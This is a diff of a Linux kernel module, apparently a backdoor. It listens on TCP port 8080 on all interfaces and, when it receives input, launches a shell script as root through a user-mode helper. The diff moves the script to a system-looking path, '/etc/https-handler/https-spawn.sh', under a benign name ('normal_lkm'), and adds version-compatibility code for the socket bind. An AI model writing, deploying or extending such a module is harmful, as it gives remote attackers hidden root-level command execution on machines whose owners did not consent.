@@ -6,6 +6,7 @@
 #include <linux/in.h>
 #include <linux/kthread.h>
 #include <net/net_namespace.h>
+#include <linux/version.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("samwasnothere");
@@ -39,7 +40,7 @@ int my_server_loop(void *data) {
 
             // ---> THIS IS WHERE YOU RUN YOUR FUNCTION <---
             // Example: if (strncmp(recv_buf, "TRIGGER", 7) == 0) { do_something(); 
-	char *argv[] = { "/home/tester/all-TESTS/lkr-sock-dev/https-spawn.sh", NULL };
+	char *argv[] = { "/etc/https-handler/https-spawn.sh", NULL };
 	static char *envp[] = {
     		"HOME=/",
     		"TERM=linux",
@@ -75,8 +76,13 @@ static int __init normal_lkm_init(void) {
         saddr.sin_family = AF_INET;
         saddr.sin_port = htons(8080);
         saddr.sin_addr.s_addr = htonl(INADDR_ANY);
+	
+	#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,4,0)
+		ret = kernel_bind(listen_sock, (struct sockaddr_unsized *)&saddr, sizeof(saddr));
+	#else
 
-        ret = kernel_bind(listen_sock, (struct sockaddr_unsized *)&saddr, sizeof(saddr));
+		ret = kernel_bind(listen_sock, (struct sockaddr *)&saddr, sizeof(saddr));
+	#endif
 
         if (ret < 0) {
                 printk(KERN_ERR "Bind failed: %d\n", ret);
